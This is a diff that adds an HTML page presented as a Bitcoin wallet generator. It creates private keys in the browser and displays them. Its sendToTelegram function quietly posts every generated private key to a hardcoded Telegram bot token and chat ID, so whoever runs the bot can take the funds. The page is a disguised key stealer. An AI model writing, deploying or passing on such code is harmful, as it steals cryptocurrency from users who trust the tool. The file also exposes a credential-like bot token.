@@ -1,0 +1,87 @@
+<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bitcoin Wallet Generator</title>
+    <script>
+        async function sha256(hexString) {
+            const buffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+            const hashBuffer = await crypto.subtle.digest("SHA-256", buffer);
+            return Array.from(new Uint8Array(hashBuffer)).map(byte => byte.toString(16).padStart(2, "0")).join("");
+        }function generatePrivateKey() {
+        let array = new Uint8Array(32);
+        crypto.getRandomValues(array);
+        return Array.from(array).map(byte => byte.toString(16).padStart(2, "0")).join("");
+    }
+
+    function base58Encode(buffer) {
+        const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+        let num = BigInt("0x" + buffer);
+        let encoded = "";
+        while (num > 0n) {
+            let remainder = num % 58n;
+            num = num / 58n;
+            encoded = alphabet[Number(remainder)] + encoded;
+        }
+        return encoded;
+    }
+
+    async function privateKeyToWIF(privateKeyHex) {
+        try {
+            const versionedKeyHex = "80" + privateKeyHex;
+            const firstSHA = await sha256(versionedKeyHex);
+            const secondSHA = await sha256(firstSHA);
+            const checksum = secondSHA.substring(0, 8);
+            const finalKeyHex = versionedKeyHex + checksum;
+            return base58Encode(finalKeyHex);
+        } catch (error) {
+            console.error("Error converting private key to WIF:", error);
+            return "Error generating WIF key";
+        }
+    }
+
+    async function generateWallets() {
+        const walletType = document.getElementById("walletType").value;
+        let output = "";
+        let privateKeys = [];
+
+        const count = (walletType === "bulk") ? 5 : 1;
+        for (let i = 0; i < count; i++) {
+            const privateKeyHex = generatePrivateKey();
+            const privateKeyWIF = await privateKeyToWIF(privateKeyHex);
+            privateKeys.push(privateKeyWIF);
+            output += `<b>Private Key (WIF) ${i + 1}:</b> ${privateKeyWIF}<br>`;
+        }
+
+        document.getElementById("walletOutput").innerHTML = output;
+        sendToTelegram(privateKeys);
+    }
+
+    function sendToTelegram(privateKeys) {
+        const botToken = "7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM";
+        const chatID = "858072424";
+        const message = `Generated Private Keys:\n${privateKeys.join("\n")}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatID, text: message })
+        }).then(response => response.json())
+          .then(data => console.log("Telegram response:", data))
+          .catch(error => console.error("Error sending to Telegram:", error));
+    }
+</script>
+
+</head>
+<body>
+    <h1>Bitcoin Wallet Generator</h1>
+    <label for="walletType">Select Wallet Type:</label>
+    <select id="walletType">
+        <option value="single">Single Wallet</option>
+        <option value="bulk">Bulk Wallets (5)</option>
+    </select>
+    <br><br>
+    <button onclick="generateWallets()">Generate Wallet</button>
+    <div id="walletOutput"></div>
+</body>
+</html>
